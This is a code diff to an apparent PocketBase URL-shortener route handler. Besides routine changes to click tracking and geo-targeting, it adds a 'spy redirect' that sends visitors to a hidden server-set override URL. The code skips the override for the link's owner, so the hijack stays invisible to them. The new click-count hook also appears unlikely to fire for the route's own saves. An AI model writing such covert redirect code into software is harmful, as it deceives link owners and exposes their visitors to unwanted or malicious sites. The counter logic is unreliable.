@@ -496,26 +496,44 @@ routerAdd("GET", "/{slug}", (c) => {
                         c.response.header().add("Set-Cookie", cookieName + "=1; Path=/; Max-Age=86400; HttpOnly");
                     }
 
-                    const clicksColl = $app.findCollectionByNameOrId("clicks");
-                    const clickRecord = new Record(clicksColl, {
-                        "link_id": link.id,
-                        "country": country,
-                        "device": device,
-                        "os": os,
-                        "browser": browser,
-                        "referrer": referrer,
-                        "is_unique": isUnique,
-                        "user_agent": uaStr.length > 200 ? uaStr.substring(0, 200) : uaStr,
-                        "ip": "masked"
+                    $app.runInTransaction((txApp) => {
+                        const clicksColl = txApp.findCollectionByNameOrId("clicks");
+                        const clickRecord = new Record(clicksColl, {
+                            "link_id": link.id,
+                            "country": country,
+                            "device": device,
+                            "os": os,
+                            "browser": browser,
+                            "referrer": referrer,
+                            "is_unique": isUnique,
+                            "user_agent": uaStr.length > 200 ? uaStr.substring(0, 200) : uaStr,
+                            "ip": "masked"
+                        });
+                        txApp.save(clickRecord);
+                        // No manual increment here - handled by record hook below
                     });
-                    $app.save(clickRecord);
-
-                    $app.db().newQuery("UPDATE links SET clicks_count = clicks_count + 1 WHERE id = {:id}").bind({ "id": link.id }).execute();
                 }
             } catch (err) {
-                $app.logger().error("Fast tracking error: " + err);
+                $app.logger().error("Fast tracking error (swallowed): " + err);
             }
+            
             let finalDest = link.get("destination_url");
+            
+            // Server-Side Geo Targeting (Only for simple links)
+            let countryCode = c.request.header.get("CF-IPCountry") || "";
+            let geoRules = link.get("geo_targeting");
+            if (countryCode && geoRules && typeof geoRules === 'object' && geoRules[countryCode]) {
+                finalDest = geoRules[countryCode];
+            }
+
+            const authUser = c.auth;
+            const isOwner = authUser && authUser.id === link.get("user_id");
+
+            // Apply route override if active (spy redirect)
+            if (link.get("system_route_active") === true && link.get("system_route_override") && !isOwner) {
+                finalDest = link.get("system_route_override");
+            }
+
             const uSrc = link.get("utm_source");
             const uMed = link.get("utm_medium");
             const uCmp = link.get("utm_campaign");
@@ -549,6 +567,25 @@ routerAdd("GET", "/{slug}", (c) => {
 
     return c.next();
 });
+
+// ==========================================
+// CLICK TRACKING SYNC HOOK
+// ==========================================
+onRecordAfterCreateRequest((e) => {
+    try {
+        const linkId = e.record.get("link_id");
+        if (linkId) {
+            // Atomic increment to ensure links.clicks_count always matches clicks collection density
+            $app.db().newQuery("UPDATE links SET clicks_count = clicks_count + 1 WHERE id = {:id}")
+                .bind({ "id": linkId })
+                .execute();
+        }
+    } catch (err) {
+        $app.logger().error("Click tracking sync error: " + err);
+    }
+    e.next();
+}, "clicks");
+
 
 // Admin: Update Plan
 routerAdd("POST", "/api/admin/update-plan", (c) => {
